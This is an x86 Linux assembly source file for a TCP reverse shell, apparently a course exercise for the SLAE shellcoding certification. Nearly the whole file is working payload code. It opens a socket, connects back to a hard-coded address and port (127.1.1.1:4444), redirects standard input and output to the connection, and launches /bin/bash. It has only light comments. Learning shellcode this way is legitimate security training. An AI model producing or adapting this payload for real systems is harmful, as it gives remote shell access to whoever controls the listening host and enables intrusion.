; TCP Reverse Shell
; For SLAE
; Howard McGreehan

global _start

section .text

_start:
	; int socketcall(int call, unsigned long *args)
	;
	; socketcall is syscall 102, or 0x66
	; socket = 0x1
	xor eax, eax
	xor ebx, ebx
	mov al, 0x66
	

	; int socket(int domain, int type, int protocol)
	push ebx
	push 0x1
	push 0x2

	; set up args for socketcall
	mov ecx, esp
	inc bl
	int 0x80

	; save the file descriptor returned by socket()
	mov edi, eax
	
connect:
	
	; int socketcall(int call, unsigned long *args)
	;
	; Again, 0x66 for socketcall
	mov al, 0x66

	; increase ebx to get 2 for AF_INET
	inc ebx	

	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen)
	; First, we need to create the sockaddr struct

	push 0x0101017f
        push word 0x5C11
        push word bx

	; save the address of sockaddr
        mov esi, esp

	; Now, let's push the addrlen (16)
	push 0x10

	; Gotta push the sockaddr pointer now
	push esi

	; Lastly, we need the socket file descriptor returned from
	push edi

	; now, set up the right args for socketcall
	mov ecx, esp
	inc ebx
	int 0x80

	; save the socketfd, zero and add two to ecx for dup2 loop
	xchg ebx, edi
	xor ecx, ecx
	mov cl, 0x2
dup:

        ; int dup2(int oldfd, int newfd)

        mov al, 63
        int 0x80
        dec ecx
        jns dup

shell:

        ; int execve(const char *pathname, char *const argv[], char *const envp[])

        ; Zero Out eax for first null (envp) and push to stack
        xor eax, eax
        push eax

        ; Now, push the string bin bash onto the stack for argv
        push 0x68736162
        push 0x2f6e6962
        push 0x2f2f2f2f

        ; Now, need filename
        ; EZ, pop into EBX
        mov ebx, esp

        push eax
        mov edx, esp

        push ebx

        mov ecx, esp

        ; Now, set up syscall
        mov al, 0xb
        int 0x80


